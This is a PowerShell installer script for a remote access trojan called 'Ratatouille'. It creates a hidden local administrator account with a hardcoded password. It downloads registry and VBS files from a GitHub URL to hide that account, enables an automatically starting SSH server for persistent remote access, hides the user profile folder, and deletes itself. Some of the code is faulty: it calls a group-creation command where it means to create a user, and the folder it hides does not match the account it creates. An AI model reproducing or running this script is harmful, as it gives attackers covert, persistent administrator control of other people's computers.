# builds resource for rat
# created by: CHEPHYTY

#random string for directories

function random_text {
    return -join ((65..90) + (97..122) | Get-Random -Count 5 | % { [char]$_ })
}
# create local admin for rat
function create_account {
    [CmdletBinding()]
    param (
        [string] $uname,
        [securestring] $pword
    )
    begin {
    }
    process {
        New-LocalGroup "$uname" -Password $pword -FullName "$uname" -Description "Temporary local admin"
        Write-Verbose "$uname local user created" 
        Add-LocalGroupMember -Group "Administrators" -Member "$uname"
        # Write-Verbose "$uname added to the local adminisrator group"
    }
    end {
    }
}

#create admin user 
$uname = random_text
$pword = (ConvertTo-SecureString "OnlyRat1234" -AsPlainText -Force)
create_account -uname $uname -pword $pword

## variables
$wd = random_text
$path = "$env:temp\$wd"
$initial_dir = $PWD.Path

# goto temp, make working directory
mkdir $path
Set-Location $path
# Set-Content -Path "poc.txt" -Value ""


# registry to hide local admin
Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/CHEPHYTY/MK1-Ratatouille/main/files/wrev.reg' -OutFile "wrev.reg"

# visual basic script to register the regisry
Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/CHEPHYTY/MK1-Ratatouille/main/files/calty.vbs' -OutFile "calty.vbs"


# enabling persistent ssh
Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
Start-Service sshd
Set-Service -Name sshd -StartupType 'Automatic'
# Get-NetFirewallRule -Name *ssh*


# install the registry
./wrev.reg; ./calty


#hide onlyrat user 
cd C:\Users
attrib.exe +h +s +r onlyrat
# Clean up and self delete
Set-Location $initial_dir
Remove-Item -Path ".\installer.ps1" -Force
